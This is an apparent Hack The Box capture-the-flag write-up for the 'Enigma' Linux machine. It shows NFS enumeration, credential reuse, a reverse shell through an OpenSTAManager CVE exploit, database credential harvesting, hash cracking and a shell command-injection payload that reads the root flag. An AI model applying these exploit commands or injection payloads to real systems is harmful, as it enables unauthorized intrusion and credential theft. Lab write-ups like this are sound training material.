---
machine: Enigma
platform: Hack The Box
category: Linux
difficulty: Easy
tags: [nfs, credential-reuse, openstamanager, cve-2025-69212, mysql-credential-harvesting, command-injection]
date: 2026-07-17
status: retired
summary: A Linux box exposing NFS, mail, and web services — testing NFS share enumeration for leaked onboarding documents, chained credential reuse across a webmail portal and an admin panel, exploitation of a real-world authenticated remote-code-execution CVE, and database credential harvesting for an unauthenticated command-injection path to root.
---

## Enumeration

portscan:

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ sudo nmap ┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ sudo nmap 10.129.56.244 -p- -T4 -oN portscan
[sudo] password for kali:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 10:06 -0400
Nmap scan report for 10.129.56.244
Host is up (0.045s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
35825/tcp open  unknown
36911/tcp open  unknown
41541/tcp open  unknown
43171/tcp open  unknown
45939/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.13 seconds
```

fingerprint:

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ sudo nmap 10.129.56.244 -p22,80,110,111,143,993,995,2049,35285,41541,43171,45939 -sCV -T4 -oN fingerprint 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 10:08 -0400
Nmap scan report for 10.129.56.244
Host is up (0.041s latency).

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open   http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
110/tcp   open   pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA PIPELINING RESP-CODES TOP AUTH-RESP-CODE STLS SASL UIDL
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
111/tcp   open   rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36911/tcp   mountd
|   100005  1,2,3      45029/tcp6  mountd
|   100005  1,2,3      60084/udp   mountd
|   100005  1,2,3      60594/udp6  mountd
|   100021  1,3,4      35825/tcp   nlockmgr
|   100021  1,3,4      42075/tcp6  nlockmgr
|   100021  1,3,4      51496/udp   nlockmgr
|   100021  1,3,4      57917/udp6  nlockmgr
|   100024  1          45939/tcp   status
|   100024  1          50817/tcp6  status
|   100024  1          51446/udp   status
|   100024  1          60133/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open   imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: more SASL-IR LOGINDISABLEDA0001 have post-login IMAP4rev1 capabilities ENABLE Pre-login IDLE STARTTLS OK ID LOGIN-REFERRALS LITERAL+ listed
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
993/tcp   open   ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: SASL-IR more have post-login ID AUTH=PLAINA0001 ENABLE capabilities IDLE IMAP4rev1 OK Pre-login LOGIN-REFERRALS LITERAL+ listed
|_ssl-date: TLS randomness does not represent time
995/tcp   open   ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA PIPELINING RESP-CODES TOP AUTH-RESP-CODE USER SASL(PLAIN) UIDL
2049/tcp  open   nfs_acl  3 (RPC #100227)
35285/tcp closed unknown
41541/tcp open   mountd   1-3 (RPC #100005)
43171/tcp open   mountd   1-3 (RPC #100005)
45939/tcp open   status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds

```

I feroxbusted the website and found nothing:

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ feroxbuster -u http://enigma.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://enigma.htb/
 🚩  In-Scope Url          │ enigma.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1195l     2955w    31133c http://enigma.htb/
[####################] - 2m     87650/87650   0s      found:1       errors:0      
[####################] - 2m     87650/87650   886/s   http://enigma.htb/          
```

I also ran a vhost fuzz for good measure, no vhosts:

```bash
──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ ffuf -u http://enigma.htb/ -H 'Host: FUZZ.enigma.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://enigma.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.enigma.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 1047 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

We get this output from connecting to IMAP

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ nc -nv 10.129.56.244 143                                                    
(UNKNOWN) [10.129.56.244] 143 (imap2) open
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.
```

Lets jump to NFS on 2049:

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ showmount -e enigma.htb                                                                                  
Export list for enigma.htb:
/srv/nfs/onboarding *
```

We can mount this locally to find a pdf:

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ sudo mount -t nfs enigma.htb:/srv/nfs/onboarding mountedlocal -o nolock

[sudo] password for kali: 
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ ls mountedlocal 
New_Employee_Access.pdf
```

In the pdf we find:

```text
Employee:Kevin Mitchell
Department:Operations
Provisioned by:IT Department
Date:2024-03-01
Webmail Access
URL:http://mail001.enigma.htb
Username:kevin
Password:Enigma2024!
```

## Foothold

We add this to our etc hosts and we can log into the web mail portal as kevin.

We have an email from `sarah@enigma.htb`, there are no creds in here so I assume it may be given to us for the user sarah@enigma.htb

```text
Hi Kevin,  
  
Welcome to the team! We're thrilled to have you on board at Enigma Corp.  
  
A little about us â€” Enigma Corp is a mid-sized technology and operations firm specializing in infrastructure management and enterprise solutions. We've been growing rapidly over the past few years and we're excited to have fresh talent joining us.  
  
I'm Sarah from the Accounts department. I'll be your point of contact for any finance-related queries during your onboarding period.  
  
We're still finalizing a few of your onboarding details â€” your system access, equipment setup, and department introductions are all being arranged by the IT team. You should be receiving your access credentials shortly via the company shared drive.  
  
In the meantime, don't hesitate to reach out if you have any questions. We want to make sure your first few days are as smooth as possible.  
  
Looking forward to working with you!  
  
Best regards,  
Sarah  
Accounts Department  
Enigma Corp  
[sarah@enigma.htb](mailto:sarah@enigma.htb)
```

We attempt cred re-use on user sarah for the webmail client and it works! We have credpair: `sarah:Enigma2024!`

We now have an email from `it@enigma.htb` and it seems to contain admin creds. We first add support_001.enigma.htb to our /etc/hosts

```text
Hi Sarah,  
  
Apologies for the delay. I have provisioned your access. Please find the details below:  
  
URL: [http://support_001.enigma.htb](http://support_001.enigma.htb)  
Username: admin  
Password: Ne3s4rtars78s  
  
Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.  
  
Regards,  
IT Support  
Enigma Corp
```

We login with `admin:Ne3s4rtars78s` into the OpenSTAManager portal. We see that it is version openstamanager 2.9.8. I then look for an authenticated CVE.

We see a CVSS 9.8 score Authenticated CVE for this version: https://www.cve.org/CVERecord?id=CVE-2025-69212

This vulnerability fails to properly sanitize user written filenames, which we can exploit for RCE. I will this exploit: https://raw.githubusercontent.com/BridgerAlderson/CVE-2025-69212-PoC/refs/heads/main/exploit.py

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ python3 exploit.py -t http://support_001.enigma.htb -u admin -p Ne3s4rtars78s --reverse-shell 10.10.15.58 4444

  _______      ________    ___   ___ ___  _____         __ ___ ___  __ ___                   
 / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|       / // _ \__ \/_ |__ \                  
| |     \ \  / /| |__ ______ ) | | | | ) | |__ ______ / /| (_) | ) || |  ) |                 
| |      \ \/ / |  __|______/ /| | | |/ /|___ \______| '_ \__, |/ / | | / /                  
| |____   \  /  | |____    / /_| |_| / /_ ___) |     | (_) |/ // /_ | |/ /_                  
 \_____|   \/   |______|  |____|\___/____|____/       \___//_/|____||_|____|                 
                                                                                             
    OpenSTAManager <= 2.9.8  |  OS Command Injection                                         
    P7M File Processing — decodeP7M() exec() sink                                            
                                                                                             
  CVE-2025-69212 Proof of Concept

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [*] Authenticating as admin...
  [+] Authenticated successfully.
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ══════════════════════════════════════════════════════════════
  ║ PLUGIN DETECTION
  ══════════════════════════════════════════════════════════════
  [*] Scanning for P7M vulnerable plugin...
  [*] Found 84 module(s).
  [+] Found 2 candidate(s).
  ├─ Module ID: 14
  ├─ Plugin ID: 21
  └─ Upload endpoint: save → http://support_001.enigma.htb/actions.php
  ══════════════════════════════════════════════════════════════


  ══════════════════════════════════════════════════════════════
  ║ REVERSE SHELL
  ══════════════════════════════════════════════════════════════
  ├─ Method: bash
  └─ Target: 10.10.15.58:4444

  [!] Start listener: nc -lvnp 4444

  [?] Press Enter when ready...
  [*] Delivering payload...
  [*] Switched to working module: 15/19
  [+] Payload delivered!
  ══════════════════════════════════════════════════════════════


  ─── Stats: 88 requests in 49.7s ───
```

We get our revshell as www-data

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ rlwrap -cAr nc -lvnp 4444                                                   
listening on [any] 4444 ...
connect to [10.10.15.58] from (UNKNOWN) [10.129.56.244] 33696
bash: cannot set terminal process group (1551): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager$ 
```

## Lateral Movement

We see an internal facing database on 3306, we may want to access that:

```bash
www-data@enigma:~/html/roundcube$ ss -tulnp
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process                                                   
udp    UNCONN  0       0              0.0.0.0:60084        0.0.0.0:*                                                              
udp    UNCONN  0       0            127.0.0.1:888          0.0.0.0:*                                                              
udp    UNCONN  0       0              0.0.0.0:60434        0.0.0.0:*                                                              
udp    UNCONN  0       0              0.0.0.0:46262        0.0.0.0:*                                                              
udp    UNCONN  0       0           127.0.0.54:53           0.0.0.0:*                                                              
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*                                                              
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*                                                              
udp    UNCONN  0       0              0.0.0.0:111          0.0.0.0:*                                                              
udp    UNCONN  0       0              0.0.0.0:51446        0.0.0.0:*                                                              
udp    UNCONN  0       0              0.0.0.0:51496        0.0.0.0:*                                                              
udp    UNCONN  0       0                 [::]:57917           [::]:*                                                              
udp    UNCONN  0       0                 [::]:60133           [::]:*                                                              
udp    UNCONN  0       0                 [::]:60594           [::]:*                                                              
udp    UNCONN  0       0                 [::]:38278           [::]:*                                                              
udp    UNCONN  0       0                 [::]:44676           [::]:*                                                              
udp    UNCONN  0       0                 [::]:111             [::]:*                                                              
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*                                                              
tcp    LISTEN  0       100          127.0.0.1:25           0.0.0.0:*                                                              
tcp    LISTEN  0       4096        127.0.0.54:53           0.0.0.0:*                                                              
tcp    LISTEN  0       100            0.0.0.0:143          0.0.0.0:*                                                              
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*                                                              
tcp    LISTEN  0       4096           0.0.0.0:43171        0.0.0.0:*                                                              
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*     users:(("nginx",pid=1587,fd=5),("nginx",pid=1586,fd=5))  
tcp    LISTEN  0       4096           0.0.0.0:111          0.0.0.0:*                                                              
tcp    LISTEN  0       100            0.0.0.0:110          0.0.0.0:*                                                              
tcp    LISTEN  0       64             0.0.0.0:2049         0.0.0.0:*                                                              
tcp    LISTEN  0       4096           0.0.0.0:22           0.0.0.0:*                                                              
tcp    LISTEN  0       4096           0.0.0.0:36911        0.0.0.0:*                                                              
tcp    LISTEN  0       4096         127.0.0.1:1337         0.0.0.0:*                                                              
tcp    LISTEN  0       4096           0.0.0.0:41541        0.0.0.0:*                                                              
tcp    LISTEN  0       100            0.0.0.0:995          0.0.0.0:*                                                              
tcp    LISTEN  0       100            0.0.0.0:993          0.0.0.0:*                                                              
tcp    LISTEN  0       64             0.0.0.0:35825        0.0.0.0:*                                                              
tcp    LISTEN  0       4096           0.0.0.0:45939        0.0.0.0:*                                                              
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*                                                              
tcp    LISTEN  0       64                [::]:42075           [::]:*                                                              
tcp    LISTEN  0       4096              [::]:46169           [::]:*                                                              
tcp    LISTEN  0       4096              [::]:50817           [::]:*                                                              
tcp    LISTEN  0       4096              [::]:45029           [::]:*                                                              
tcp    LISTEN  0       100               [::]:143             [::]:*                                                              
tcp    LISTEN  0       511               [::]:80              [::]:*     users:(("nginx",pid=1587,fd=6),("nginx",pid=1586,fd=6))  
tcp    LISTEN  0       4096              [::]:111             [::]:*                                                              
tcp    LISTEN  0       100               [::]:110             [::]:*                                                              
tcp    LISTEN  0       64                [::]:2049            [::]:*                                                              
tcp    LISTEN  0       4096              [::]:22              [::]:*                                                              
tcp    LISTEN  0       4096              [::]:57817           [::]:*                                                              
tcp    LISTEN  0       100              [::1]:25              [::]:*                                                              
tcp    LISTEN  0       100               [::]:995             [::]:*                                                              
tcp    LISTEN  0       100               [::]:993             [::]:* 
```

We attempt to reverse/remote port forward the database back to kali with ssh:

```bash
www-data@enigma:~/html/roundcube/SQL$ ssh -N -R 127.0.0.1:3306:127.0.0.1:3306 kali@10.10.15.58
```

This doesn't connect to our kali though for some reason, so we are going to chisel the database.

While probing the webmail directory I find an interesting line that seems to be a roundcube username and password to a mysql database:

```text
$config['db_dsnw'] = 'mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail';
```

After chiseling 3306 back to our kali, we can connect to roundcube as roundcube@localhost:

```bash
./chisel_1.11.5_linux_amd64 server -p 9000 --reverse # kali listen

./chisel client 10.10.15.58:9000 R:3306:127.0.0.1:3306 # remote forward on target
```

```bash
──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ mysql -u roundcube -p'Yo270x26!gTx02' -h 127.0.0.1 -P 3306 --skip-ssl-verify-server-cert
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 529
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> select version()
    -> 
    -> ^C
MySQL [(none)]> select version();
+-------------------------+
| version()               |
+-------------------------+
| 8.0.46-0ubuntu0.24.04.3 |
+-------------------------+
1 row in set (0.044 sec)

MySQL [(none)]> select system_user()
    -> ^C
MySQL [(none)]> select system_user();
+---------------------+
| system_user()       |
+---------------------+
| roundcube@localhost |
+---------------------+
1 row in set (0.140 sec)
```

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| roundcubemail      |
+--------------------+
3 rows in set (0.046 sec)

MySQL [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MySQL [(none)]> select roundcubemail;
ERROR 1054 (42S22): Unknown column 'roundcubemail' in 'field list'
MySQL [(none)]> show tables from roundcubemail;
+-------------------------+
| Tables_in_roundcubemail |
+-------------------------+
| cache                   |
| cache_index             |
| cache_messages          |
| cache_shared            |
| cache_thread            |
| collected_addresses     |
| contactgroupmembers     |
| contactgroups           |
| contacts                |
| dictionary              |
| filestore               |
| identities              |
| responses               |
| searches                |
| session                 |
| system                  |
| users                   |
+-------------------------+
17 rows in set (0.046 sec)
```

We get hashes for sarah and kevin:

```bash
MySQL [(none)]> describe users from roundcubemail;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'from roundcubemail' at line 1
MySQL [(none)]> select * from roundcubemail.users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | kevin    | localhost | 2026-05-26 11:00:00 | 2026-07-16 14:40:15 | 2026-05-26 11:10:06 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"jXKCkTD6NJX1CfH7";} |
|       2 | sarah    | localhost | 2026-05-26 11:01:39 | 2026-07-16 14:43:27 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"E2t73i4vcknHDz71";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
2 rows in set (0.042 sec)
```

We attempt to crack with hashcat and fail.

Changing course for now, we transfer and run linpeas. Some of the findings that catch my eye are :

```text
╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available                                                                                                                                                                                                                       
╚ https://www.cve.org/CVERecord?id=CVE-2026-43284                                                                                                                                                                                                                                              
╚ https://www.cve.org/CVERecord?id=CVE-2026-43500                                                                                                                                                                                                                                              
CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6                                                                                                                                                                                                                           
CVE-2026-43500 (rxrpc): autoloadable: rxrpc
modprobe mitigation (xfrm-ESP): not found
modprobe mitigation (rxrpc): not found
Unprivileged user namespaces: disabled (breaks the public PoC)
CVE-2026-43284 reachable but public PoC blocked by disabled user namespaces.
CVE-2026-43500 reachable but public PoC blocked by disabled user namespaces.
Mitigation: 'install esp4/esp6/rxrpc /bin/false' in /etc/modprobe.d/, then rmmod;
or sysctl kernel.unprivileged_userns_clone=0; or apply distro patches.
```

We also may have a keepass2 binary in /usr/lib and a .bashrc and .profile in /etc/skel/

```text
╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html                                                                                                                                                                                               
PackageKit version detected: 1.2.8                                                                                                                                                                                                                                                             
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8 is in the vulnerable range >=1.0.2 <=1.3.4
```

In OpenStaManager config.inc.php we get more creds for the OpenStaManager db:

```php
// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size'
```

We can use this to connect to the db on port 3306:

```bash
┌──(kali㉿kali)-[10.10.15.58]-[~/htb/engima]
└─$ mysql -u brollin -p'Fri3nds@9099' -h 127.0.0.1 -P 3306 --skip-ssl-verify-server-cert
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 728
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| openstamanager     |
| performance_schema |
+--------------------+
3 rows in set (0.042 sec)

MySQL [(none)]> 
```

We navigate to zz_users and get a bcrypt hash for `haris` and `admin`, we can attempt to crack these with hashcat:

```bash
MySQL [(none)]> select * from openstamanager.zz_users;

1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb

2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb

hashcat -m 3200 openstahash /usr/share/wordlists/rockyou.txt

$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

We have our user haris with credpair: `haris:bestfriends`, we can `su haris` from our revshell to get a shell as him.

## Privilege Escalation

We curl the suspicious 1337 port and see that its a webapp. After chiseling it back to our host we find it to be running OliveTin version x known for a critical Authenticated RCE.

the config.yaml has no users listed and to edit it we need to be user Kevin.

If we curl the localhost:1337 we see that its an OliveTin web server. We attempt an authenticated and unauthenticated RCE CVE for it: https://www.thehackerwire.com/olivetin-critical-unauthenticated-rce/. But neither work surprisingly. 

As we poke around the site we can try the same command injection logic on db_pass for backup databases and achieve unauthenticated RCE as root.

We use command injection payload `a'; cat /root/root.txt; '` and are redirected to a terminal, originally for backing up databases, outputting our root flag,
